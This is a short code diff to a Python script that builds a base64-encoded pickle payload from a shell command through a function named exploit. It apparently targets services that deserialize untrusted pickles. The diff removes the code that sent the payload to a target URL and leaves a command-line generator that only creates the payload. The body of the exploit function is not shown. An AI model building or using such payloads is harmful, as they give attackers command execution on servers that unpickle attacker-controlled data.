@@ -3,10 +3,6 @@ from __future__ import print_function
 import codecs
 import pickle
 import subprocess
-try:
-    import urllib2 as r
-except ImportError:
-    import urllib.request as r
 
 
 def exploit(cmd):
@@ -36,18 +32,9 @@ USAGE = '''
 if __name__ == '__main__':
     import sys
 
-    # if len(sys.argv) < 3:
     if len(sys.argv) != 2:
         sys.stderr.write(USAGE)
         sys.exit(1)
-
-    # url, cmd = sys.argv[1], sys.argv[2:]
-    # payload = codecs.encode(pickle.dumps(exploit(cmd)), 'base64')
-    # req = r.Request(url, payload)
-    # resp = r.urlopen(req)
-
-    # print('Response from server:')
-    # print(resp.read())
 
     cmd = sys.argv[1]
     payload = codecs.encode(pickle.dumps(exploit(cmd)), 'base64')
